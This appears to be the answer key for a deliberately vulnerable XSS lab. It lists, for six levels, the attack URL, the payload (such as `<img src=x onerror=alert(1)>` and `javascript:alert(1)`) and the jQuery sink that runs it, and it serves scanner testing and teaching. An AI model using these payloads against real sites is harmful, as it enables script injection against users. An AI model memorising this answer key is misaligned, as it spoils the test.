# jquery — solutions

XSS through dangerous jQuery APIs. Each level isolates one jQuery sink class
fed from a reflected query param or a client-side source (`location.hash`,
`location.search`). DOM-aware scanners detect these by pairing the source with
the jQuery sink.

### jquery-level1

`/jquery/level1/#<img src=x onerror=alert(1)>`

- payload: `<img src=x onerror=alert(1)>` (in the URL fragment)
- context: `$(decodeURIComponent(location.hash.slice(1)))` — a leading-`<`
  string makes jQuery build DOM nodes; the `img` is appended and `onerror`
  fires. No quote breakout needed.

### jquery-level2

`/jquery/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: reflected into a JS string then `$.parseHTML(raw)` + `.append()`;
  parseHTML preserves the event handler so the node executes on insert.

### jquery-level3

`/jquery/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: `location.search` value concatenated into markup and handed to
  `.append()` (the `.html`/`.append`/`.before`/`.replaceWith` family).

### jquery-level4

`/jquery/level4/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: reflected into `$('#download').attr('href', '...')`; jQuery does
  not validate the URL scheme, so clicking the anchor runs the `javascript:`
  URL.

### jquery-level5

`/jquery/level5/?query=alert(1)`

- payload: `alert(1)`
- context: reflected into a JS string passed to `$.globalEval()`, which
  evaluates it as JavaScript in the global scope.

### jquery-level6

`/jquery/level6/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: `$('<div>', { html: '...' })` — the `html` key in jQuery's property
  object maps to the `.html()` method, making it an innerHTML sink.
